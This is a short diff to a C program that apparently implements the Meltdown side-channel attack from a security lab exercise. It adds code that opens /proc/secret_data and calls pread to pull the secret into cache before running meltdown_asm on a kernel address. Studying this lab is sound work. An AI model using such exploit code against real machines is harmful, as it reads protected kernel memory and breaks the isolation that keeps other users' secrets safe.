@@ -89,7 +89,17 @@ int main()
   flushSideChannel();
     
   if (sigsetjmp(jbuf, 1) == 0) {
-      meltdown_asm(0xf9c91000);
+      // meltdown(0xf9c91000); // Original
+
+      // Open the /proc/secret_data virtual file.
+      int fd = open("/proc/secret_data", O_RDONLY);
+      if (fd < 0) {
+          perror("open");
+          return -1;
+      }
+      int ret = pread(fd, NULL, 0, 0); // Cause the secret data to be cached.
+
+      meltdown_asm(0xf9c91000); // Mod 1
   }
   else {
       printf("Memory access violation!\n");
